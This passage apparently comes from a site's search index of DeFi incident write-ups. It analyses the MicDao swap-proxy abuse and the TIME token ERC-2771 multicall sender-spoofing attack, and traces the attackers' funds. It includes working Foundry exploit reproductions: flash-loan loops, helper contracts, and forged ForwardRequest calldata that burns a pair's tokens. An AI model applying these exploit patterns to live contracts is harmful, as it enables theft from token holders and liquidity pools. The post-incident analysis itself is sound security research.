occurred around 7 AM, while this attacker began their operations around 10 AM.</p>"},{"location":"2023/230905_HeavensGate_JumpFarm_QuantumWN/#misc","title":"Misc","text":""},{"location":"2023/230905_HeavensGate_JumpFarm_QuantumWN/#frontrunning-protection","title":"Frontrunning Protection","text":"<p>Unlike the attack on FloorDAO, every transaction initiated by this attacker is tagged with <code>MEV Transaction</code> and <code>Flashbots</code>, indicating the use of FlashBots to prevent frontrunning.</p>"},{"location":"2023/230905_HeavensGate_JumpFarm_QuantumWN/#patch","title":"Patch","text":"<p>As of the time of this analysis, none of these projects have implemented patches similar to FloorDAO. Interestingly, due to the absence of patches and the projects' overall inactivity, along with no bots performing <code>rebase</code>, it appears that some individuals are still exploiting lagging epoch for similar attacks.</p> <p>For example, this attacker is able to successfully launch an attack at intervals.</p>"},{"location":"2023/231018_MicDao/","title":"231018-MicDao","text":""},{"location":"2023/231018_MicDao/#attacktx","title":"AttackTx","text":"<p>Analyzing the attack transaction using Phalcon.</p>"},{"location":"2023/231018_MicDao/#fund-flow","title":"Fund Flow","text":"<p>The fund flow initially appears to be quite complex.</p> <p></p> <p>First, the attacker borrowed approximately 670k USDT from the DoDo pool for the subsequent attack.</p> <p></p> <p>Next, the attacker used 500k of that to purchase around 171k MicDao tokens from the PancakePair. (2, 3)</p> <p></p> <p>Following this, the attack contract intermediated through contract 0xaebb, interacting with contract 0x1934, exchanging 2k USDT for 20k MicDao tokens. (4, 5, 6, 11)</p> <p></p> <p>During this process, MicDao tokens and a significant amount of USDT (160k) were transferred into the pair. (7, 8)</p> <p></p> <p>Simultaneously, LP tokens were minted. (9, 10)</p> <p>Therefore, the earlier transfer of tokens into the pair was likely for adding liquidity.</p> <p>The subsequent fund flow is nearly identical to the previous one, with multiple interactions involving the contract 0x1934, and the exchange of 2k USDT for 20k MicDao tokens. Therefore, the earlier 160k USDT added to liquidity likely represents the cumulative amount added through these interactions.</p> <p></p> <p>Finally, the attacker exchanged approximately 974k MicDao tokens for about 672k USDT.</p> <p></p> <p>In the end, some MicDao tokens were transferred to address 0x000...0001, suggesting a burn operation was executed. After repaying the borrowed funds, the attacker made a profit of approximately 12k USDT, which was sent to another address. (332)</p> <p>Clearly, the entire process reveals irregularities. Through intermediary contracts, the user could consistently exchange MicDao tokens at a fixed 1:10 price and receive additional MicDao tokens as a subsidy to add liquidity to the pair. The reason why attackers profit appears to be that after buying a large amount of MicDao tokens (after which the price of MicDao tokens will become very high), they can still continuously use intermediary contracts to obtain MicDao tokens at a fixed low price, while adding liquidity to the pool, so that even if some tokens were burnt, they can still sell the obtained more tokens at a better price and ultimately make a profit.</p>"},{"location":"2023/231018_MicDao/#balance-changes","title":"Balance Changes","text":"<p>The balance changes align closely with the Fund Flow analysis. It's evident that the USDT losses primarily came from the pair.</p>"},{"location":"2023/231018_MicDao/#state-changes","title":"State Changes","text":"<p>Notably, it appears that MicDao did not undergo similar burn operations in the past.</p>"},{"location":"2023/231018_MicDao/#invocation-flow","title":"Invocation Flow","text":"<p>Below, we provide a detailed analysis of the internal transaction calls.</p> <p></p> <p>Consistent with our earlier analysis, the attacker initiated a flash loan of USDT and, within the callback function, approved the corresponding token. Subsequently, they used 500,000 USDT to purchase MicDao tokens.</p> <p></p> <p>Following this, a <code>create-&gt;transfer-&gt;work</code> loop ensues.</p> <p>Within this loop, the attacker first deploys a smart contract and transfers 2,000 USDT to its address. They then call the contract's <code>work</code> function. Within this function, the intermediary contract <code>swapProxy</code> is invoked with its <code>swap</code> function. The logic of this function aligns with the earlier analysis of the Fund Flow, executing the exchange at a fixed rate of 1:10 for MicDao tokens. In other words, the attacker acquires 20,000 MicDao tokens with 2,000 USDT. Subsequently, the intermediary contract adds liquidity to the pool. (Due to the significant MicDao price increase caused by the attacker's large-scale exchange, adding 2,000 USDT corresponds to adding approximately 23 MicDao tokens.)</p> <p>From this process, it becomes evident that the exchange of USDT for MicDao tokens through the <code>swap</code> function of the intermediary contract <code>swapProxy</code> does not involve swapping via a pair. Instead, the intermediary contract itself possesses a substantial number of MicDao tokens and directly offers them to the buyer at a fixed rate of 1:10. Simultaneously, it provides some MicDao tokens and uses the user's inputted USDT to add liquidity.</p> <p></p> <p>Finally, since the attacker obtained a significant amount of MicDao tokens at a \"low price\", and the pool became thicker, even though a substantial amount of tokens were inexplicably burned, the attacker still managed to sell them to acquire more USDT than the invested amount. The profits were then transferred to another address.</p> <p>This analysis closely aligns with the Fund Flow analysis.</p>"},{"location":"2023/231018_MicDao/#vulnerability","title":"Vulnerability","text":"<p>The evident logic flaw lies within the <code>swap</code> function of the intermediary contract responsible for exchanging MicDao tokens.</p> <p>However, this contract is not open source. Nonetheless, a rudimentary analysis by decompilation suggests that its execution logic is similar to the preceding calls.</p> <p></p> <p>It's worth noting that this function imposes a limit on the amount of USDT an account can swap.</p> <pre><code>cast storage 0x19345233ea7486c1d5d780a19f0e303597e480b5 9 --rpc-url https://rpc.ankr.com/bsc\n</code></pre> <p>Upon inspection, this limit is set to 2000 ether. This explains why the attacker repeatedly created new contracts to invoke the <code>swap</code> function.</p> <p></p> <p>Additionally, the MicDao tokens transferred to the <code>sender</code> here are calculated as <code>amountUSDT * 1e18 / _price / 2</code>.</p> <pre><code>cast storage 0x19345233ea7486c1d5d780a19f0e303597e480b5 7 --rpc-url https://rpc.ankr.com/bsc\n</code></pre> <p>With a price of 0.05e18, this results in the sender receiving MicDao tokens in proportion to a 1:10 ratio.</p> <p>Examining some of the normal <code>swap</code> transactions before the attack, such as this transaction, the fund flow is as follows.</p> <p></p> <p>It reveals a similar fund flow to the attacker's <code>swap</code> logic. The key difference is that not all the incoming USDT was used to add liquidity; 10% was transferred to another address.</p> <p>Checking the transaction history of the sender of this transaction reveals a call to the <code>bindRelationship(address referrer)</code> function of another contract before the <code>swap</code>. The address set as the referrer in this function call matches the address to which the funds were transferred during the <code>swap</code>. In contrast, the attacker omitted this <code>bindRelationship</code> step and instead set the calling contract as the referrer in the <code>swap</code> parameters.</p> <p>(Based on the presence of <code>referrer</code>, <code>bindRelationship</code>, and other clues, it seems like this might be a referral-based protocol designed to profit from recommending others, somewhat resembling a Ponzi scheme.)</p> <p>In conclusion, it appears that this MicDao token was designed with a special <code>swap</code> entry point that allows for a fixed 1:10 exchange of USDT for MicDao tokens. The entire attack process follows this logic, involving the creation of numerous contracts to call <code>swap</code> in exchange for MicDao (in this sense, it resembles a Sybil Attack). It also leverages a thicker liquidity pool to make a profit. </p> <p>Furthermore, this MicDao token has the following <code>transfer</code> function:</p> <pre><code>function _transfer(address sender, address recipient, uint256 amount) internal override {\n    if (pairList[recipient] &amp;&amp; !isDelivers[sender]) {\n        uint256 toBurn = amount.mul(45).div(100);\n        super._transfer(sender, address(1), toBurn);\n        amount = amount.sub(toBurn);\n    }\n    super._transfer(sender, recipient, amount);\n}\n</code></pre> <p>Based on related transactions, <code>pairList</code> is set as the PancakePair, while <code>isDelivers</code> is set to the aforementioned intermediary contract <code>swapProxy</code>. Consequently, if a user tries to transfer tokens directly to the pair for swapping or liquidity provision, 45% of the tokens will be burned.</p> <p>Moreover, as mentioned earlier, there were no burn operations conducted on MicDao tokens before the attack, indicating that no one attempted token swaps through the pair.</p>"},{"location":"2023/231018_MicDao/#exploit","title":"Exploit","text":""},{"location":"2023/231018_MicDao/#reproduction","title":"Reproduction","text":"<p>Based on the analysis above, combined with the AttackTx, we can reproduce the exploit as follows.</p> <pre><code>function testExploit() public {\n    uint attackBlockNumber = 32711747;\n    vm.rollFork(attackBlockNumber);\n\n    deal(address(usdt), address(this), 0);\n\n    dodo.flashLoan(0, (usdt.balanceOf(address(dodo)) * 99) / 100, address(this), \"0x00\");\n\n    emit log_named_decimal_uint(\"Total USDT profit\", usdt.balanceOf(address(this)), usdt.decimals());\n}\n\nfunction DPPFlashLoanCall(address /*sender*/, uint256 /*baseAmount*/, uint256 quoteAmount, bytes calldata /*data*/) external {\n    usdt.approve(address(router), type(uint256).max);\n    MicDao.approve(address(router), type(uint256).max);\n    usdtToMicDao();\n\n    uint8 i;\n    while (i &lt; 80) {\n        HelperContract helper = new HelperContract();\n        usdt.transfer(address(helper), 2_000 ether);\n        helper.work();\n        ++i;\n    }\n\n    MicDaoTousdt();\n    usdt.transfer(msg.sender, quoteAmount);\n}\n\nfunction usdtToMicDao() internal {\n    address[] memory path = new address[](2);\n    path[0] = address(usdt);\n    path[1] = address(MicDao);\n\n    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        500_000 ether,\n        0,\n        path,\n        address(this),\n        block.timestamp\n    );\n}\n\nfunction MicDaoTousdt() internal {\n    address[] memory path = new address[](2);\n    path[0] = address(MicDao);\n    path[1] = address(usdt);\n\n    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        MicDao.balanceOf(address(this)),\n        0,\n        path,\n        address(this),\n        block.timestamp\n    );\n}\n</code></pre> <p>The loop for creating contracts used for <code>swap</code> is as follows.</p> <pre><code>contract HelperContract {\n    IMicDaoSwap private constant SwapContract = IMicDaoSwap(0x19345233ea7486c1D5d780A19F0e303597E480b5);\n    IERC20 private constant usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 private constant MicDao = IERC20(0xf6876f6AB2637774804b85aECC17b434a2B57168);\n    address private immutable owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function work() external {\n        usdt.approve(address(SwapContract), type(uint256).max);\n        SwapContract.swap(2_000 ether, owner);\n        MicDao.transfer(owner, MicDao.balanceOf(address(this)));\n        selfdestruct(payable(owner));\n    }\n}\n</code></pre>"},{"location":"2023/231018_MicDao/#attack-flow-a-crazy-hacker","title":"Attack Flow | A Crazy Hacker","text":"<p>Analyzing the entire attack process of the attacker address 0xcd03 on MicDao. (It can be observed that as of the time of writing this article, this address has initiated a significant number of transactions.)</p> <p></p> <p>Initially, the attacker obtained funds from FixedFloat on August 24th for transaction fees in subsequent activities.</p> <p></p> <p>On August 25th and 26th, the attacker created two contracts, but as of now, there are no recorded invocations.</p> <p></p> <p>On September 3rd, the attacker created another contract and called its <code>tokenTest</code> function, exchanging 0.1 BNB for another token, which appeared to be without a meaningful purpose.</p> <p></p> <p>Subsequently, on the same day, two transactions about address 0x547f were made.</p> <p></p> <p>On September 7th, there was another transaction involving address 0x181e.</p> <p></p> <p>Half an hour later, a contract was created, and the <code>0x8a27ecfb</code> function was called.</p> <p>Using Phalcon analysis, it is evident that this was another attack, targeting the HCT token, resulting in a profit of approximately 35 BNB. Similar to the MicDao attack, the gains were transferred to the address 0xa5b9.</p> <p></p> <p></p> <p>The next transaction occurred on October 16th, seemingly creating a contract, but, in reality, the contract merely transferred funds to another address 0x3a86 through selfdestruct. (This added layer through the contract obscures the transfer and can help to some extent in preventing fund tracing.)</p> <p></p> <p>Then, on October 18th, the attacker called the <code>destroy</code> function of a contract created by address 0x3a86. Immediately after, three contracts were created, and the third contract's <code>0x8a27ecfb</code> function was called, initiating an attack on MicDao. (The other two contracts created had no subsequent interactions.)</p> <p></p> <p>On October 20th, 0.43 BNB was used to exchange for USDT and was transferred to address 0x3a86.</p> <p></p> <p>Two days later, on October 22nd, the attacker transferred BNB to address 0xa5b9, followed by calls to the <code>approve</code> and <code>Multicall</code> functions, using PancakeRouter to exchange 2 BNB for USDT.</p> <p>Subsequently, the attacker approved the contract 0x833b for USDT tokens, and the contract 0x11f3 (MintPool) for BOS tokens, with the contract 0x833b being created by address 0x3a86.</p> <p>Subsequently, multiple calls were made to the <code>tokenTest</code> function of the contract 0x833b and the <code>sell</code> function of the MintPool contract.</p> <p>Using Phalcon analysis, it is apparent that this was likely another attack, targeting BOS tokens. In the <code>tokenTest</code> transactions, the attacker used a small amount of USDT to acquire a large amount of BOS tokens and later exchanged them for a substantial amount of USDT tokens in the <code>sell</code> transactions. (The reason why the attacker chose to initiate multiple transactions rather than writing a single attack contract is not clear at this time, as the attack principle has not yet been analyzed.)</p> <p></p> <p>After this attack concluded, on the same day (October 22nd), approximately 12k USDT was transferred to address 0xf610. On the following day, October 23rd, approximately 56k USDT and 1.8 BNB were transferred to address 0xa5b9.</p> <p>As of the time of writing this article, there have been no further transactions from this address, and most of the profit funds have already been transferred out.</p> <p>By tracing the addresses interacting with the MicDai attacker's address reveals that this seems to be a crazy hacker who frequently launches an attack, with at least the following attacks present.</p> <ul> <li>0xcd03</li> <li>HTC 09/28/2023</li> <li>MicDao 10/18/2023</li> <li>BOS 10/22/2023</li> <li>0x547f</li> <li>SUT 07/21/2023</li> <li>BTCMT 07/23/2023</li> <li>0x181e</li> <li>CLASSIC 09/28/2023</li> <li>0xe9f2</li> <li>NFTT 12/08/2023</li> </ul> <p>Furthermore, the interaction chain between addresses is complex. Funds are frequently transferred between multiple addresses, and situations where one address creates contracts that another address calls are also observed.</p>"},{"location":"2023/231018_MicDao/#misc","title":"Misc","text":"<p>Now, let's delve into some miscellaneous aspects of the MicDao attack.</p>"},{"location":"2023/231018_MicDao/#frontrunning-protection","title":"Frontrunning Protection","text":"<p>From the previous analysis, it is evident that the attacker has launched multiple attacks, displaying a high level of expertise, and seemingly avoiding frontrunning.</p> <p>In the case of the MicDao attack, the attacker deployed three contracts in total.</p> <p></p> <p></p> <p>Upon decompilation, it becomes clear that these contracts were designed specifically for the MicDao attack. However, the first two contracts appear to have issues. For instance, the second contract is nearly identical to the third one used for the actual attack, except that the initial USDT amount for exchanging MicDao is set at 400k, and the number of contract creations for 'swap' is increased to 150.</p> <pre><code>function testFirstAttackContract() external {\n    uint attackBlockNumber = 32711519;\n    vm.rollFork(attackBlockNumber);\n    vm.startPrank(0xCD03ed98868A6cd78096F116A4b56a5f2C67757d, 0xCD03ed98868A6cd78096F116A4b56a5f2C67757d);\n    (bool success, ) = address(0x19925F6f3Fd654Fe98c0a16D751E24Dd176AE8f9).call(hex\"8a27ecfb\");\n    require(success);\n}\n\nfunction testSecondAttackContract() external {\n    uint attackBlockNumber = 32711643;\n    vm.rollFork(attackBlockNumber);\n    vm.startPrank(0xCD03ed98868A6cd78096F116A4b56a5f2C67757d, 0xCD03ed98868A6cd78096F116A4b56a5f2C67757d);\n    vm.txGasPrice(3000300501);\n    uint256 beforeAttack = usdt.balanceOf(address(0xA5b92A7abebF701B5570db57C5d396622B6Ed348));\n    (bool success, ) = address(0x0697B5dc2365e2735Bc1F086E097bcf0c61f518d).call(hex\"8a27ecfb\");\n    require(success);\n    emit log_named_decimal_uint(\"Total USDT profit\", usdt.balanceOf(address(0xA5b92A7abebF701B5570db57C5d396622B6Ed348)) - beforeAttack, usdt.decimals());\n}\n\nfunction testThirdAttackContract() external {\n    uint attackBlockNumber = 32711700;\n    vm.rollFork(attackBlockNumber);\n    vm.startPrank(0xCD03ed98868A6cd78096F116A4b56a5f2C67757d, 0xCD03ed98868A6cd78096F116A4b56a5f2C67757d);\n    vm.txGasPrice(3000300501);\n    uint256 beforeAttack = usdt.balanceOf(address(0xA5b92A7abebF701B5570db57C5d396622B6Ed348));\n    (bool success, ) = address(0x502b4A51ca7900F391d474268C907B110a277d6F).call(hex\"8a27ecfb\");\n    require(success);\n    emit log_named_decimal_uint(\"Total USDT profit\", usdt.balanceOf(address(0xA5b92A7abebF701B5570db57C5d396622B6Ed348)) - beforeAttack, usdt.decimals());\n}\n</code></pre> <p>Simulating this would result in an error. It's evident that 150 'swap' operations would require 300k, in addition to the 400k USDT needed for the exchange, totaling 700k USDT, whereas the DoDo pool holds less than 700k USDT. It's puzzling why such illogical contract logic was deployed to the chain.</p> <p>Upon analyzing the pseudocode, it's clear that the attacker implemented anti-frontrunning logic. For example, the final profits are not directly sent to the sender but to another address. Additionally, the <code>require</code> statements restrict <code>tx.origin</code> and <code>gasPrice</code> for transactions. However, it's worth mentioning that this seems like a relatively standard approach, raising questions about why it wasn't been frontrun.</p> <p>(On a side note, due to the use of gasPrice restrictions, the logic in the decompiled code generated by dedaub may have certain issues, which can be analyzed in conjunction with ethervm decompilation.)</p>"},{"location":"2023/231018_MicDao/#patch","title":"Patch","text":"<p>Approximately an hour after the attack, the MicDao team took action to salvage the remaining funds in the pair. They first called <code>rescueTokens</code> to withdraw all LP tokens and then used <code>removeLiquidity</code> to remove liquidity from the pair, obtaining approximately 5.5k USDT.</p> <p></p> <p>The next day, on October 19th, they called the <code>changeRouterAddress</code> function to disable the <code>swap</code> functions.</p>"},{"location":"2023/231018_MicDao/#scam","title":"Scam?","text":"<p>It's worth noting that the project team's address 0x6a83 made a transfer to address 0x1572 eventually.</p> <p>Checking this address reveals that the project team created new MicDao tokens, a new pair, and a new intermediary contract for the <code>swap</code> operation.</p> <p>Upon a brief analysis, it becomes evident that the new contract includes restrictions on <code>codesize</code> for callers.</p> <p></p> <p>(However, it is apparent that the restrictions can be easily bypassed.)</p> <p>Furthermore, unlike before, the <code>_transfer</code> function for the new token is as follows:</p> <pre><code>function _transfer(address sender, address recipient, uint256 amount) internal override {\n    if(pairList[recipient] &amp;&amp; !isDelivers[sender] &amp;&amp; sender!=address(this)){\n        uint256 toSwap = amount.mul(70).div(100);\n        super._transfer(sender, address(this), toSwap);\n        swapTokensForToken(toSwap);\n        amount = amount.sub(toSwap);\n    }\n    super._transfer(sender, recipient, amount);\n}\n</code></pre> <p>When users directly transfer tokens to the pair for exchange or liquidity provision, 70% of the tokens are immediately exchanged by the token contract in advance. This seems highly unreasonable, equivalent to reducing the user's token holdings by 70%, and the origin exchange was frontrun, inflating the price. But on the flip side, it prevents attacks similar to the previous one.</p> <p>As a result, while regular users can acquire MicDao tokens at a fixed price, selling them directly would result in a clear loss. This raises concerns and suspicions about whether this is a fraudulent project.</p>"},{"location":"2023/231206_TIME/","title":"231206-TIME","text":""},{"location":"2023/231206_TIME/#attacktx","title":"AttackTx","text":"<p>Analyzing the attack transaction using Phalcon.</p>"},{"location":"2023/231206_TIME/#fund-flow","title":"Fund Flow","text":"<p>The fund flow is straightforward. Initially, the <code>attackContract</code> exchanges 5 Ether for WETH, then exchanges WETH for TIME tokens (4, 5), with a possibility that some TIME tokens were burned during the exchange process (6).</p> <p>Subsequently, TIME tokens are exchanged back for WETH, yielding approximately 94.5 WETH, significantly more than the initial 5 WETH input.</p> <p>Finally, a bribe is made to the builder, indicating the use of Flashbots' service to prevent frontrunning.</p> <p>From the fund flow, it appears that there was a vulnerability in the TIME token that allowed the attacker to burn TIME tokens in the Uniswap pair, artificially increasing the price of the TIME tokens obtained, thus profiting from the attack.</p>"},{"location":"2023/231206_TIME/#invocation-flow","title":"Invocation Flow","text":"<p>Next, let's analyze the invocation flow.</p> <p></p> <p>Similar to the previous analysis, there is an exchange of WETH for TIME tokens.</p> <p></p> <p>Subsequently, a <code>execute</code> function of a Forwarder contract is called, with parameters including a signature verified by <code>ecrecover</code>.</p> <p>Next, the <code>multicall</code> function of the TIME token is called, followed by a call to the <code>burn</code> function. Strangely, the Uniswap pair's token is burned directly here, rather than the attacker's own tokens.</p> <p></p> <p>Finally, a <code>sync</code> is called, reducing the reserves corresponding to the TIME tokens in the pair. This raises the price of TIME tokens, allowing the attacker to sell them for WETH, completing the attack by bribing the builder.</p>"},{"location":"2023/231206_TIME/#vulnerability","title":"Vulnerability","text":"<p>It is evident that the vulnerability exploited by the attacker lies in the call flow <code>Forwarder.execute-&gt;Token.multicall-&gt;Token.burn</code>. Let's analyze it below.</p> <p>The main code of Forwarder is as follows:</p> <pre><code>struct ForwardRequest {\n    address from;\n    address to;\n    uint256 value;\n    uint256 gas;\n    uint256 nonce;\n    bytes data;\n}\n\nfunction verify(ForwardRequest calldata req, bytes calldata signature) public view returns (bool) {\n    address signer = _hashTypedDataV4(\n        keccak256(abi.encode(TYPEHASH, req.from, req.to, req.value, req.gas, req.nonce, keccak256(req.data)))\n    ).recover(signature);\n\n    return _nonces[req.from] == req.nonce &amp;&amp; signer == req.from;\n}\n\nfunction execute(ForwardRequest calldata req, bytes calldata signature)\n    public\n    payable\n    returns (bool, bytes memory)\n{\n    require(verify(req, signature), \"MinimalForwarder: signature does not match request\");\n    _nonces[req.from] = req.nonce + 1;\n\n    // solhint-disable-next-line avoid-low-level-calls\n    (bool success, bytes memory result) = req.to.call{ gas: req.gas, value: req.value }(\n        abi.encodePacked(req.data, req.from)\n    );\n\n    if (!success) {\n        // Next 5 lines from https://ethereum.stackexchange.com/a/83577\n        if (result.length &lt; 68) revert(\"Transaction reverted silently\");\n        assembly {\n            result := add(result, 0x04)\n        }\n        revert(abi.decode(result, (string)));\n    }\n    // Check gas: https://ronan.eth.link/blog/ethereum-gas-dangers/\n    assert(gasleft() &gt; req.gas / 63);\n    return (success, result);\n}\n</code></pre> <p>The core function <code>execute</code> accepts a <code>ForwardRequest</code> and <code>signature</code>, verifies that the signer is <code>req.from</code>, and then uses the relevant information from <code>req</code> to make a call to <code>req.to</code> with gas as <code>req.gas</code> and value as <code>req.value</code>, using data as <code>abi.encodePacked(req.data, req.from)</code>.</p> <p>In this attack, the request encapsulated here is evidently a multicall to the TIME token. The implementation of this function is as follows:</p> <pre><code>function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {\n    results = new bytes[](data.length);\n    for (uint256 i = 0; i &lt; data.length; i++) {\n        results[i] = Address.functionDelegateCall(address(this), data[i]);\n    }\n    return results;\n}\n\nfunction _functionDelegateCall(address target, bytes memory data) private returns (bytes memory) {\n    require(AddressUpgradeable.isContract(target), \"Address: delegate call to non-contract\");\n\n    // solhint-disable-next-line avoid-low-level-calls\n    (bool success, bytes memory returndata) = target.delegatecall(data);\n    return AddressUpgradeable.verifyCallResult(success, returndata, \"Address: low-level delegate call failed\");\n}\n</code></pre> <p>It directly calls <code>delegatecall</code> on <code>address(this)</code> with the given data,  which actually calls the <code>burn</code> function below.</p> <pre><code>function burn(uint256 value) public virtual {\n    _burn(_msgSender(), value);\n}\n\nfunction _msgSender()\n    internal\n    view\n    virtual\n    override(ContextUpgradeable, ERC2771ContextUpgradeable)\n    returns (address sender) {\n    return ERC2771ContextUpgradeable._msgSender();\n}\n\nfunction _msgSender() internal view virtual override returns (address sender) {\n    if (isTrustedForwarder(msg.sender)) {\n        // The assembly code is more direct than the Solidity version using `abi.decode`.\n        assembly {\n            sender := shr(96, calldataload(sub(calldatasize(), 20)))\n        }\n    } else {\n        return super._msgSender();\n    }\n}\n</code></pre> <p>The <code>burn</code> function burns the tokens of <code>_msgSender()</code>. The <code>_msgSender()</code> function calls <code>_msgSender()</code> from ERC2771. In this function, it first checks if <code>msg.sender</code> is a <code>TrustedForwarder</code>. If not, indicating a regular user's call, it returns <code>msg.sender</code> normally. Otherwise, it indicates a call through a legitimate Forwarder contract, returning the last 20 bytes of the data as the sender.</p> <p>The process of function calls implemented through Forwarder is actually ERC-2771, which allows for function calls without the need for users to send transactions themselves, but instead providing a signature for others to execute the corresponding function calls. The request forwarded by Forwarder can be understood as a packaged call. As long as the user provides the call information and the corresponding signature, others can make the call on their behalf.</p> <p>Normally, the process of forwarding calls by this Forwarder should be perfectly reasonable. When determining the sender of the call, it should obviously be the signer of <code>req</code>, not the actual transaction sender. So, during forwarding, the Forwarder appends <code>req.from</code>, the signer, to the end of the data, and then in <code>_msgSender</code>, it reads the last 20 bytes, thus correctly obtaining the msgSender.</p> <p>At first glance, this process seems fine. However, by combining with the <code>multicall</code> function implemented by the TIME token, the attacker bypassed the above identification of sender.</p> <p>The <code>req.data</code> passed by the attacker is as follows:</p> <pre><code>0xac9650d8   // multicall\n0000000000000000000000000000000000000000000000000000000000000020\n0000000000000000000000000000000000000000000000000000000000000001\n0000000000000000000000000000000000000000000000000000000000000020\n0000000000000000000000000000000000000000000000000000000000000038\n42966c68    // burn\n0000000000000000000000000000000000000000c9112ec16d958e8da8180000  // value\n760dc1e043d99394a10605b2fa08f123d60faf840000000000000000\n</code></pre> <p>The final data forwarded by the Forwarder is <code>req.data + req.from</code>. Thus, the Forwarder effectively forwarded a <code>multicall</code> to the TIME token. In this call, if <code>msgSender()</code> is involved, it will be the address of the actual attacker. However, the <code>multicall</code> will continue to delegatecall, and at this point, the attacker can maliciously append an additional address after the data of the single <code>multicall</code>, allowing the call to be executed with a manipulated sender without affecting the original call.</p> <pre><code>forwarder -&gt; multicall + req.from\n    multicall (msgSender-&gt;req.from) -&gt; burn + pairAddress\n        burn (msgSender-&gt;\n\npairAddress) \n</code></pre> <p>OpenZeppelin considers this as an Arbitrary Address Spoofing Attack.</p>"},{"location":"2023/231206_TIME/#exploit","title":"Exploit","text":""},{"location":"2023/231206_TIME/#reproduce","title":"Reproduce","text":"<p>According to the attack principles mentioned earlier, the vulnerability exploitation script can be constructed as follows.</p> <pre><code>(addr, privateKey) = makeAddrAndKey(\"attacker\");\n\nfunction testExploit() public {\n    vm.startPrank(addr, addr);\n    uint attackBlockNumber = 18730462;\n    vm.rollFork(attackBlockNumber);\n    deal(address(weth), address(addr), 5 ether);\n    uint256 wethBalanceBefore = weth.balanceOf(address(addr));\n    emit log_named_decimal_uint(\"WETH balance before attack\", wethBalanceBefore, 18);\n    time.approve(address(router), type(uint256).max);\n    weth.approve(address(router), type(uint256).max);\n    WETHToTIME();\n\n    emit log_named_decimal_uint(\"Pair TIME balance\", time.balanceOf(address(time_weth)), time.decimals());\n\n    // construct calldata\n    uint256 burnAmount = time.balanceOf(address(time_weth)) - 1e18;\n    bytes memory burnData = abi.encodeWithSelector(ITIME.burn.selector, burnAmount);\n    bytes[] memory data = new bytes[](1);\n    data[0] = abi.encodePacked(burnData, address(time_weth));\n    bytes memory multicallData = abi.encodeWithSelector(ITIME.multicall.selector, data);\n\n    // construct ForwardRequest\n    bytes32 TYPEHASH = keccak256(\"ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,bytes data)\");\n    Forwarder.ForwardRequest memory req = Forwarder.ForwardRequest({\n        from: address(addr),\n        to: address(time),\n        value: 0,\n        gas: 5e6,\n        nonce: 0,\n        data: multicallData\n    });\n    // construct signature\n    bytes32 structHash = keccak256(abi.encode(TYPEHASH, req.from, req.to, req.value, req.gas, req.nonce, keccak256(req.data)));\n    bytes32 _CACHED_DOMAIN_SEPARATOR= hex\"7ce8d495cdbd0e4deb3abed5528be0aca8dae1c9f4172364ceec32c5051da6b8\";\n    bytes32 messageHash = ECDSA.toTypedDataHash(_CACHED_DOMAIN_SEPARATOR, structHash);\n    (uint8 v, bytes32 r, bytes32 s) =  vm.sign(privateKey, messageHash);\n    bytes memory signature = abi.encodePacked(r, s, v);\n\n    forwarder.execute(req, signature);\n    time_weth.sync();\n    emit log_named_decimal_uint(\"Pair TIME balance\", time.balanceOf(address(time_weth)), time.decimals());\n\n    TIMEToWETH();\n    uint256 wethBalanceAfter = weth.balanceOf(address(addr));\n    emit log_named_decimal_uint(\"WETH balance after attack\", wethBalanceAfter, 18);\n    emit log_named_decimal_uint(\"Attacker profit\", wethBalanceAfter - wethBalanceBefore, 18);\n    vm.stopPrank();\n}\n\n\nfunction WETHToTIME() internal {\n    address[] memory path = new address[](2);\n    path[0] = address(weth);\n    path[1] = address(time);\n    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        weth.balanceOf(address(addr)),\n        0,\n        path,\n        address(addr),\n        block.timestamp\n    );\n}\n\nfunction TIMEToWETH() internal {\n    address[] memory path = new address[](2);\n    path[0] = address(time);\n    path[1] = address(weth);\n    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        time.balanceOf(address(addr)),\n        0,\n        path,\n        address(addr),\n        block.timestamp\n    );\n}\n</code></pre> <p>After buying TIME tokens, the attacker first constructed malicious <code>multicall</code> invocation data, then crafted the corresponding ForwardRequest, followed by constructing the message hash and signing it. They then forwarded the execution message through the Forwarder, burning almost all TIME tokens in the pool, driving up the price before exchanging their TIME tokens for ETH to profit.</p> <p>However, because the original attack did not burn all TIME tokens in the Pair to drain it, it was attacked again approximately 5 hours later. In this attack, the attacker directly made the Pair transfer a large amount of tokens to them by constructing a malicious ForwardRequest, then exchanged them for ETH to profit.</p>"},{"location":"2023/231206_TIME/#attack-flow","title":"Attack Flow","text":"<p>It is apparent that the actual attacker behind the attack was frontrunner, who directly copied the attack invocation from the original attacker (<code>req.from</code> is the original attacker).</p> <p></p> <p>The original attacker transferred about 0.5 ETH from an address (possibly used for a mixing service) on the afternoon of December 6. Then in the evening, they created an attack contract against the TIME token, but before they could launch the transaction, they were immediately frontrun by frontrunner (in the next block after the contract creation).</p> <p>Two hours later, they created an attack contract against the Dyl token, but once again, they were frontrun by frontrunner.</p> <p>Half a day later, they created an attack contract against the PCOIN token and launched the attack.</p> <p></p> <p>However, due to the error in the attack logic, this attack failed.</p> <p>Half a month later, the attacker transferred the remaining funds to another address.</p> <p></p> <p>They then created a token called BEACH and its corresponding pair, and added liquidity.</p> <p>However, the BEACH token was attacked by another attacker two days later, due to the <code>burn</code> function being public.</p>"},{"location":"2023/231206_TIME/#misc","title":"Misc","text":""},{"location":"2023/231206_TIME/#copycat","title":"Copycat","text":"<p>In addition to the original attack, which was copied by others due to the remaining funds, there were many attacks targeting the same vulnerability. For example, there were several attempts by the original attacker to launch further attacks.</p> <p></p> <p>The attack on the PCOIN token failed due to the attack logic error, but shortly after, another copycat launched an attack against the token.</p> <p>Checking this address reveals that it has launched other attacks as well.</p> <p></p> <p>The attacker claimed to be thankful for the teachings of BlockSec and claimed to be a whitehat who would return the funds.</p> <p></p> <p>However, several months later, some funds were transferred to Tornado Cash, which is somewhat suspicious.</p>"},{"location":"2023/231206_TIME/#patch","title":"Patch","text":"<p>OpenZeppelin subsequently updated the implementation of the <code>multicall</code> function to avoid this kind of vulnerability. The current implementation is as follows:</p> <pre><code>/*\n * NOTE: Since 5.0.1 and 4.9.4, this contract identifies non-canonical contexts (i.e. `msg.sender` is not {_msgSender}).\n * If a non-canonical context is identified, the following self 